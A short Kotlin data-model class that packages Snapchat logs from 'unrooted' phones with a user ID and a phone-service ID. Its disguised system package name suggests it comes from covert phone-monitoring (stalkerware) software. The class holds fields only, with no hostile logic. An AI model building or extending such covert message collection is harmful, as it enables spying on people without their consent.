package com.android.services.models

import com.android.services.db.entities.SnapChatUnrooted
import com.google.gson.annotations.SerializedName

class SnapChatUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var snapChatUnrootedList: List<SnapChatUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        snapChatUnrootedList: List<SnapChatUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.snapChatUnrootedList = snapChatUnrootedList
    }
}